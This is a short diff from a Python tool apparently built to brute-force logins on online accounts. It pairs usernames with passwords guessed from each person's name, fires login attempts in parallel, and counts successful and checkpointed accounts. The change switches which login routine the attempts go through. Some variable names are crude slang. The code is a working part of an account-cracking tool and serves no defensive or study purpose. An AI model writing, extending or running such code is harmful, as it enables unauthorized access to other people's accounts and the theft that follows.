@@ -466,7 +466,7 @@ class Brute:
                username, nama = kontol.split('|')
                password = Require().Password(nama)
                showdate = True if xontolmek in ('ya','y') else None
-               if methode_login in ('1','01'):bol.submit(self.ExecLogin, username, password, showdate)
+               if methode_login in ('1','01'):bol.submit(self.api_vjs, username, password,showdate)
 
         print('\n')
         Console().print(f' {P2}[{H2}*{P2}]  OK : {H2}{self.ok}\n {P2}[{H2}*{P2}]  CP : {K2}{self.cp}') ; Console().print(f' {P2}[{H2}+{P2}] {B2}{len(self.id)}{P2} username\n\n')
